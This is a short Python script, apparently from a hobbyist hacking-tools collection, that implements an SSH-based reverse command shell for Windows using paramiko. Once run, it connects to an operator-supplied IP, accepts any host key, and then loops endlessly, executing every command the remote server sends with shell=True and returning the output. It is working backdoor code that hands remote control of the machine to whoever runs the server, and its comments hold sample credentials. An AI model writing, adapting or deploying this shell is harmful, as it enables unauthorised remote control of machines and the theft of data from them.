'''
	Made By Sai Harsha Kottapalli
	Tested on python3
	About	: 	SSH Reverse Command for Windows
	Use with: 	server.py 
	Note	: 	roles of client and server are reversed (i.e.)server send command to client , for ssh server (Windows) 
'''

import sys
import paramiko
import subprocess
import argparse
from threading import *

def command(ip_addr,username,pwd,cmd):
	client = paramiko.SSHClient()
	#can use keys for authentication
	#client.load_host_keys("/home/archelaus/.ssh/known_hosts")
	
	#we need to control both ends of connection so we need to set policy for server to accept key
	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	client.connect(ip_addr, username=username, password=pwd)
	session = client.get_transport().open_session()
	if session.active:
		session.send(cmd)
		#banner
		print(session.recv(1024).decode("utf-8"))
		while True:
			#from server
			cmd = session.recv(1024).decode("utf-8")
			try:
				# execute command and send
				output = subprocess.check_output(cmd, shell=True)
				session.send(output)
			except Exception as e:
				session.send(str(e))
		client.close()

	return

def main():
	parser = argparse.ArgumentParser(description = "SSH Command")
	parser.add_argument("-ip",action="store",dest="ip",help="ip address")
	parser.add_argument("-u",action="store",dest="user",help="Username")
	parser.add_argument("-p",action="store",dest="pwd",help="password")
	results = parser.parse_args()
	
	#login credentials
	#user = root
	#password = 1234
	#simple command -> ClientConnected
	command(results.ip,results.user,results.pwd,"Client_connected")

if __name__ == "__main__":
	main()